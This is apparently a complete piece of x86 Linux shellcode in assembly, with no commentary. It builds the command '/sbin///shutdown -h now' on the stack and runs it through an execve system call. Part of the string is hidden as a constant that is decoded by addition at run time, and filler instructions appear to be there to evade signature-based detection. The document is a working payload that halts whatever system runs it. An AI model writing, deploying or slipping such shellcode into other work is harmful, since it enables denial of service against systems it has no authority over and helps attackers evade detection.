
global _start			

section .text
_start:


	xor    eax,eax 
	xor    edx,edx
	push   eax     
	push   word 0x682d
	mov    edi,esp
	push   eax
	push   0x6e
	mov    word [esp+0x1],0x776f
	mov    edi,esp
	push   eax
	mov ecx, 0x5D665E53
	add ecx, 0x11111111
	mov dword [esp-4],ecx
	mov dword [esp-8],0x74756873
	shl eax,2
	mov dword [esp-12],0x2f2f2f6e
	shr eax,3
	mov dword [esp-16],0x6962732f
	sub esp,16
	mov    ebx,esp
	push   edx
	push   esi
	push   edi
	push   ebx
	mov    ecx,esp
	mov    al,0xb ;the syscall execve
	int    0x80
